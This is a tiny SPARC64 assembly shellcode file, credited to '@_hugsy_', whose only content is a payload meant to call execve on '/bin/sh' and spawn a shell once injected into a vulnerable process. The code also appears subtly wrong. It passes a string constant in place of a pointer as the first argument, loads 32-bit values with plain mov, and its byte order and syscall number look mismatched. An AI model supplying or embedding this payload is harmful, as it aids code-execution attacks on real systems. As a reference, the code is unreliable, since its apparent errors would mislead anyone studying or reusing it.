;;; SPARC64 sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
    mov  0x6e69622f, %g1
    st %g1, [ %sp ]
    mov  0x0068732f, %g1
    st %g1, [ %sp + 4 ]
    mov  %g1, %o0
    clr  %o1
    clr  %o2
    mov  11, %g1
    t 0x6d
